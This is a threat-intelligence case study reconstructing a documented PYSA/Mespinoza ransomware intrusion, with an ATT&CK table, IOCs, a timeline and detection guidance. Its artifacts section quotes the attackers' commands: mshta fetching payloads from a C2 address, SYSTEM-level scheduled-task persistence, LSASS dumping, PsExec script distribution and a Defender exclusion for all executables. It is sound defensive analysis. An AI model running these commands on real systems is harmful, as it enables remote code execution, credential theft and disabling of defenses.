# PYSA / Mespinoza - DFIR Case Study

👉🏾 [**Version française**](./dfir_case_study_FR.md)

**AFRINTEL Threat Actor Intelligence**

- **Actor / Operation:** PYSA / Mespinoza
- **Threat type:** Ransomware / Double extortion
- **Analysis type:** DFIR reconstruction of one documented intrusion
- **Documented duration:** about 8 hours
- **Primary source:** The DFIR Report, Case 1010
- **Report date:** 23 November 2020
- **Geography:** external reference case, not an AFRINTEL African victim
- **Last updated:** 26 August 2026

---

## 1. Incident summary

The DFIR Report documented an intrusion in which the threat actor entered through Internet-exposed RDP using a valid Domain Administrator account. The connection came from a Tor exit node and was handed off across three Tor exit IPs during the intrusion.

The actor moved to a domain controller within minutes, deployed PowerShell Empire, used Koadic, repeatedly collected credentials, moved mainly through RDP, used PsExec for automated credential collection and eventually deployed PYSA ransomware around the 7.5-hour mark.

No plaintext exfiltration channel was directly seen. Exfiltration itself was confirmed later because canary documents from the victim environment were opened from external Tor exit nodes.

This is an **incident-level DFIR case**. AFRINTEL does not apply this full chain to every PYSA victim.

---

## 2. Main attack chain

| Phase | Technique | ATT&CK | Behavior | Evidence | Scope | Confidence | Provenance |
|---|---|---|---|---|---|---|---|
| Initial Access | External Remote Services | T1133 | Internet-exposed RDP | Observed | Incident | High | The DFIR Report |
| Initial Access | Valid Accounts | T1078 | Valid Domain Administrator account used | Observed | Incident | High | The DFIR Report |
| Remote Access | Remote Desktop Protocol | T1021.001 | RDP used for entry and most lateral movement | Observed | Incident | High | The DFIR Report |
| Execution | PowerShell | T1059.001 | Empire launcher and other scripts | Observed | Incident | High | The DFIR Report |
| Execution | Mshta | T1218.005 | Koadic launched with `mshta` | Observed | Incident | High | The DFIR Report |
| Persistence | Scheduled Task | T1053.005 | Koadic HTA task at logon as SYSTEM | Observed | Incident | High | The DFIR Report |
| Credential Access | LSASS Memory | T1003.001 | Task Manager, `comsvcs.dll`, Mimikatz; ProcDump attempted | Observed | Incident | High | The DFIR Report |
| Credential Access | NTDS | T1003.003 | Shadow copy of `ntds.dit` created/accessed | Observed | Incident | High | The DFIR Report |
| Discovery | Account Discovery | T1087 | `whoami`, `net` and other commands | Observed | Incident | High | The DFIR Report |
| Discovery | Remote System Discovery | T1018 | Built-in commands and network discovery | Observed | Incident | High | The DFIR Report |
| Discovery | Domain Trust Discovery | T1482 | `nltest` and AD-focused discovery | Observed | Incident | High | The DFIR Report |
| Discovery | Process Discovery | T1057 | Process listing during local discovery | Observed | Incident | High | The DFIR Report |
| Lateral Movement | SMB/Windows Admin Shares | T1021.002 | PsExec/script distribution | Observed | Incident | High | The DFIR Report |
| Execution | Service Execution | T1569.002 | PsExec used for remote execution | Observed | Incident | High | The DFIR Report |
| Defense Evasion | Impair Defenses | T1562.001 | Defender disabled and exclusions added | Observed | Incident | High | The DFIR Report / AFRINTEL mapping |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Exact channel not seen; RDP/Empire/Koadic assessed as likely path | Assessed | Incident | Medium | The DFIR Report |
| Impact | Data Encrypted for Impact | T1486 | PYSA ransomware deployed and executed | Observed | Incident | High | The DFIR Report |

---

## 3. Key commands and artifacts

### Koadic launch

```text
mshta http://45.147.231.210:9999/8k6Mq
mshta http://45.147.231.210:9999/VtgyT
```

### Koadic persistence

```text
schtasks /create /tn K0adic /tr "C:\Windows\system32\mshta.exe C:\ProgramData\SZWXNUHHDP.hta" /sc onlogon /ru System /f
```

### Credential dumping

```text
procdump.exe -accepteula -ma lsass.exe mem.dmp
```

The ProcDump command was attempted, but ProcDump was not present on the endpoint. Other LSASS techniques were successful, including Task Manager and `comsvcs.dll`.

### PsExec distribution

```text
PsExec.exe -d \\HOST -u "DOMAIN\USER" -p "PASSWORD" -accepteula -s cmd /c "powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"
```

### Defender exclusion

```powershell
Add-MpPreference -ExclusionExtension ".exe"
```

The case also documents Defender Event IDs 5001 and 5007 around security-control changes.

---

## 4. Infrastructure and historical IOCs

| Indicator | Context |
|---|---|
| `198.96.155.3` | RDP / Tor exit |
| `23.129.64.190` | RDP / Tor exit |
| `185.220.100.240` | RDP / Tor exit |
| `194.36.190.74:443` | Empire C2 |
| `45.147.231.210:9999` | Koadic C2 |

### Files / hashes

| File | SHA-256 |
|---|---|
| `svchost.exe` | `df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c` |
| `p.ps1` | `eb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def` |
| `p.ps1` | `0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e` |
| `XEKFGUIQQB.hta` | `81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77` |

These are historical, incident-specific IOCs from 2020. They are not current PYSA infrastructure by default.

---

## 5. Exfiltration assessment

The source did not observe plaintext exfiltration traffic. It did confirm that files left the environment because canary documents were opened after ransomware deployment from Tor exit nodes.

AFRINTEL therefore records:

- **Data exfiltration:** Confirmed
- **Exact channel:** Not confirmed
- **Likely channel:** RDP, Empire or Koadic
- **Evidence:** Observed for the fact of exfiltration; Assessed for the channel
- **Confidence:** High for exfiltration, Medium for the channel

---

## 6. Simplified timeline

```text
T+00:00   Exposed RDP + valid Domain Admin
T+00:03   Lateral movement to domain controller
           |-- discovery
           |-- PowerShell Empire
           |-- LSASS / credential collection
           |-- Koadic
           |-- RDP / PsExec
           |-- file collection
           |-- Defender impairment
T+~07:30  PYSA deployment begins
           |-- encryption
           |-- later canary callbacks confirm exfiltration
```

---

## 7. Detection and threat-hunting opportunities

Useful signals from this case include:

- Internet-facing RDP used by a privileged account from Tor/VPN infrastructure;
- rapid RDP pivot from a workstation to a domain controller;
- `mshta` fetching remote HTA/JScript content;
- scheduled task launching `mshta` from `C:\ProgramData`;
- LSASS dumping through `comsvcs.dll` or Task Manager;
- PsExec distributing PowerShell scripts from a domain-controller share;
- `ntds.dit` shadow-copy activity and Directory Service Event ID 1917;
- Defender exclusions for all `.exe` files;
- repeated credential-dumping behavior across many hosts.

---

## 8. AFRINTEL assessment and intelligence gaps

This case is valuable because the ransomware binary is only the final stage. The intrusion can be reconstructed from access, identity, C2, discovery, credential theft, lateral movement, defense evasion, collection and impact evidence.

The public case does not establish that every PYSA intrusion followed this same playbook. It also does not establish which exact C2 channel carried the stolen files.

---

## 9. Sources

- The DFIR Report - **PYSA/Mespinoza Ransomware**, 23 November 2020, Case 1010
- MITRE ATT&CK for technique normalization

---

**AFRINTEL - African Cyber Threat Intelligence**
